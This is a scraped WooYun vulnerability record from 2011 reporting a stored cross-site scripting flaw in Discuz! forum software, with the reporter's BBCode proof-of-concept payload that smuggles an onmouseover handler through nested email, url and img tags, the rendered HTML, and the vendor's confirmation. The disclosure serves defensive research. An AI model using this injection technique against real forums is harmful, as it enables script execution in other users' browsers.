{"id": 22491, "wybug_id": "wooyun-2011-02299", "wybug_title": "Discuz!多版本 存储型XSS脚本漏洞", "wybug_corp": "Discuz!", "wybug_author": "黑病毒", "wybug_date": "2011-06-23 14:57", "wybug_open_date": "2011-07-23 15:00", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "存储型", "黑盒测试技巧", "标签安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2011-06-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2011-06-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2011-06-26：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2011-08-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2011-08-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2011-09-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2011-07-23：\t细节向公众公开  简要描述： 2009年一次偶然间测试发现的此XSS漏洞，因为是存储型的，我想大家应该知道它的危害吧。相隔这么多年DZ不断的更新版本，但此漏洞依然存在,今天就发布出来吧！留着也没什么用会长毛的，呵呵。在此我要感谢一下我的好朋友Jackal在09年的时候一起帮我测试漏洞的。当时我们一起测试的是DZ6.0-DZ7.2，不知道是不是通杀啊。哈哈！没有一个一个去测试。有条件的去测试一下吧。 详细说明：  发贴进入源码模式，写入如下的exp\n[email][url][img]http://qhkest.com onmouseover=alert(/DZ-xss-0day/); [/img] [/url][/email]\n上面代码是以鼠标事件来触发XSS的，剩下的大家可以自行发挥构造！！！附上XSS完的源码如下：\n<a href=\"mailto:\"></a><a href=\"%5C%22http://qhkest.com\" onmouseover=\"alert(/DZ-xss-0day/);\" \\\"=\"\" target=\"\\&quot;_blank\\&quot;\"><img src=\"http://qhkest.com%20onmouseover=alert%28/DZ-xss-0day/%29;\" onload=\"thumbImg(this)\" alt=\"\"> </a><\n我想你们一看就明白了吧！！！   漏洞证明：  本地测试结果：Discuz! X2\n\n   修复方案：  你们懂得，此漏洞很简单。   版权声明：转载请注明来源 黑病毒@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2011-06-23 18:09 厂商回复： 感谢您的支持,我们已经确认此问题, 稍后将会提供修补方案 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2011-06-23 16:38 |    \t\tpg5yl8 \t\t\t( 实习白帽子  |\t\t\t        Rank:91 漏洞数:12        | 我神马都不会 但我常常被人日 这是为神马呢)\t\t \n  mark    \n     2011-06-23 18:54 |    \t\tP w \t\t\t( 实习白帽子  |\t\t\t        Rank:72 漏洞数:14        | -这家伙很懒,什么都没有留下。其实我真的很...)\t\t \n  刚刚在群里收到了discuz的人修复通知..说出漏洞了.我第一时间上wooyun上看的 果然在这里.    \n     2011-06-23 22:02 |    \t\t黑病毒 \t\t\t( 实习白帽子  |\t\t\t        Rank:50 漏洞数:2        | 我不是什么白帽子，如果有问题找剑心！呵呵)\t\t \n  没想到反应这么快啊。呵呵    \n     2011-06-24 15:23 |    \t\tJ4nker \t\t\t( 普通白帽子  |\t\t\t        Rank:136 漏洞数:35        | I have a dream)\t\t \n  这个 我表示已经耶稣公布出来了，版权是你的    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}